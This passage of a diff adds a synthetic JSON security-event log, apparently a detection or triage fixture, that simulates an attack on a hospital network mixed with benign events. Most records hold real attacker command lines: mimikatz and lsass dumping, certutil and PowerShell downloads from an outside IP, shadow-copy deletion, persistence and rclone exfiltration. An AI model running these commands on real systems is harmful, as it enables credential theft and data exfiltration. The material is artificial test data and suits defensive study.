+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "dr.smith@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Mass file enumeration",
+        "files_accessed": 2847,
+        "pattern": "*.pdf,*.docx"
+      }
+    },
+    "target": {
+      "hostname": "FILE-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:28:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "AttachUserPolicy",
+        "policy": "AdministratorAccess",
+        "target_user": "admin.chen"
+      }
+    },
+    "target": {
+      "hostname": "AWS-IAM"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:28:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "PBX admin access attempt",
+        "action": "call_records_export"
+      }
+    },
+    "target": {
+      "hostname": "VOIP-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:29:00Z",
+      "product_name": "Defender",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-database@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "MSSQLSERVER",
+        "reason": "maintenance_window"
+      }
+    },
+    "target": {
+      "hostname": "SQL-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:30:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "AddUserToGroup",
+        "group": "DomainAdmins",
+        "target_user": "admin.chen"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:30:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "mimikatz.exe",
+        "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:31:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "ResetPassword",
+        "target_user": "svc-ehr-backup",
+        "method": "Admin override"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:31:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "certutil.exe",
+        "command_line": "certutil -urlcache -split -f http://91.215.85.12/payload.exe C:\\temp\\svc.exe",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:32:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "powershell.exe",
+        "command_line": "powershell -enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEEAYwB0AGkAdgBlAEQAaQByAGUAYwB0AG8AcgB5AA==",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:32:00Z",
+      "product_name": "Defender",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "cmd.exe",
+        "command_line": "cmd /c whoami /all",
+        "parent": "w3wp.exe",
+        "detection": "WebShell activity"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:32:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "CreateScheduledTask",
+        "task": "MercyBackup",
+        "run_as": "SYSTEM",
+        "target_host": "EHR-SERVER-01"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:33:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "ModifyServiceAccount",
+        "service": "svc-ehr-backup",
+        "new_role": "db_owner"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:33:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "dsquery.exe",
+        "command_line": "dsquery user -limit 0 -o dn",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:33:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-hr@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "workday-agent.exe",
+        "action": "payroll_sync"
+      }
+    },
+    "target": {
+      "hostname": "HR-APP-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:34:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "procdump.exe",
+        "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:34:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "AddToLocalAdmins",
+        "target_host": "EHR-SERVER-01",
+        "target_user": "admin.chen"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:34:00Z",
+      "product_name": "Defender",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "nltest.exe",
+        "command_line": "nltest /dclist:mercy-hospital.org",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:35:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "reg.exe",
+        "command_line": "reg save HKLM\\SAM C:\\temp\\sam.save",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:35:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "ModifyRegistryKey",
+        "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+        "value": "UseLogonCredential=1"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:36:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "DisableAuditPolicy",
+        "policy": "ObjectAccess",
+        "scope": "OU=Servers"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:36:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "net.exe",
+        "command_line": "net user admin.chen P@ssw0rd123! /domain /add",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:37:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-patching@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "wuauclt.exe",
+        "action": "patch_scan"
+      }
+    },
+    "target": {
+      "hostname": "WSUS-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:37:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "DisableFirewallRule",
+        "rule": "Block-Outbound-445",
+        "scope": "EHR-VLAN"
+      }
+    },
+    "target": {
+      "hostname": "FW-EDGE-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:38:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "mimikatz.exe",
+        "command_line": "mimikatz.exe \"lsadump::dcsync\" /domain:mercy-hospital.org",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "BILLING-WS-03"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:38:00Z",
+      "product_name": "Defender",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "cmd.exe",
+        "command_line": "cmd /c netstat -ano | findstr ESTABLISHED",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:38:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "AddToGroup",
+        "group": "Backup Operators",
+        "target_user": "admin.chen"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:39:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "EnableRemoteDesktop",
+        "target_hosts": [
+          "EHR-SERVER-01",
+          "EHR-SERVER-02",
+          "BILLING-DB-01"
+        ]
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:39:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "powershell.exe",
+        "command_line": "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://91.215.85.12/invoke-kerberoast.ps1')\"",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "BILLING-WS-03"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:40:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "CreateServicePrincipal",
+        "principal": "ehr-exfil-svc",
+        "permissions": [
+          "s3:*",
+          "rds:*"
+        ]
+      }
+    },
+    "target": {
+      "hostname": "AWS-IAM"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:40:00Z",
+      "product_name": "Defender",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "ldifde.exe",
+        "command_line": "ldifde -f c:\\temp\\ad_dump.ldf -d \"dc=mercy-hospital,dc=org\"",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:41:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "wmic.exe",
+        "command_line": "wmic shadowcopy delete",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:41:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-wifi@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "wlc-monitor.exe",
+        "action": "rogue_ap_scan",
+        "rogues_found": 0
+      }
+    },
+    "target": {
+      "hostname": "WLC-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:42:00Z",
+      "product_name": "Defender",
+      "event_type": "privilege_escalation"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "ModifyGPO",
+        "gpo": "Default Domain Policy",
+        "change": "Disabled credential guard"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:43:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "psexec.exe",
+        "command_line": "psexec.exe \\\\EHR-SERVER-01 -s cmd.exe",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:44:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "tasklist.exe",
+        "command_line": "tasklist /v /fo csv",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:44:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.martinez@mercy-hospital.org"
+      },
+      "ip": "10.10.5.45"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "Patient Portal",
+        "location": "Chicago, US",
+        "mfa": "verified"
+      }
+    },
+    "target": {
+      "hostname": "WS-NURSE-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:45:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "CreateAccessKey"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "CreateAccessKey",
+        "target_user": "ehr-exfil-svc",
+        "access_key_id": "AKIA3EXAMPLE1234"
+      }
+    },
+    "target": {
+      "hostname": "AWS-IAM"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:45:00Z",
+      "product_name": "Defender",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "sqlcmd.exe",
+        "command_line": "sqlcmd -S BILLING-DB-01 -Q \"SELECT TOP 10000 * FROM PatientBilling\"",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "BILLING-WS-03"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:46:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "ntdsutil.exe",
+        "command_line": "ntdsutil \"activate instance ntds\" ifm \"create full c:\\temp\\ntds\"",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:47:00Z",
+      "product_name": "Defender",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-monitoring@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Prometheus Node Exporter",
+        "reason": "version_upgrade"
+      }
+    },
+    "target": {
+      "hostname": "MON-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:47:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "schtasks.exe",
+        "command_line": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\temp\\svc.exe\" /sc ONSTART /ru SYSTEM",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:48:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "s3:ListBuckets",
+        "buckets_accessed": [
+          "mercy-ehr-backups",
+          "mercy-patient-records",
+          "mercy-billing-archive"
+        ]
+      }
+    },
+    "target": {
+      "hostname": "AWS-S3"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:48:00Z",
+      "product_name": "Defender",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "xcopy.exe",
+        "command_line": "xcopy C:\\EHR\\PatientData\\*.* C:\\staging\\ /S /E /H",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:49:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "7z.exe",
+        "command_line": "7z.exe a -p patient_records.7z C:\\EHR\\PatientData\\*",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:49:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "surgeon.park@mercy-hospital.org"
+      },
+      "ip": "10.10.7.22"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "Surgical Schedule",
+        "location": "Chicago, US",
+        "mfa": "biometric"
+      }
+    },
+    "target": {
+      "hostname": "WS-SURGEON-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:50:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "cloud-backup-svcs.ru",
+        "bytes_transferred": 524288000,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:50:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "vssadmin.exe",
+        "command_line": "vssadmin delete shadows /all /quiet",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:51:00Z",
+      "product_name": "AWS GuardDuty",
+      "event_type": "anomalous_api_call"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "action": "s3:GetBucketAcl",
+        "bucket": "mercy-patient-records",
+        "result": "success"
+      }
+    },
+    "target": {
+      "hostname": "AWS-S3"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:51:00Z",
+      "product_name": "Defender",
+      "event_type": "suspicious_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "rar.exe",
+        "command_line": "rar.exe a -hp C:\\staging\\records2.rar C:\\EHR\\LabResults\\*",
+        "parent": "cmd.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:52:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "rclone.exe",
+        "command_line": "rclone.exe copy C:\\staging\\ remote:exfil-bucket --transfers 8",
+        "parent": "powershell.exe"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:53:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "large_data_transfer"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.20.10"
+    },
+    "security_result": {
+      "severity": "CRITICAL"
+    },
+    "additional": {
+      "raw_log": {
+        "protocol": "HTTPS",
+        "dest_port": 443,
+        "dest_domain": "cloud-backup-svcs.ru",
+        "bytes_transferred": 1073741824,
+        "destination_ip": "91.215.85.12"
+      }
+    },
+    "target": {
+      "hostname": "91.215.85.12"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:53:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "process_execution"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "10.10.50.88"
+    },
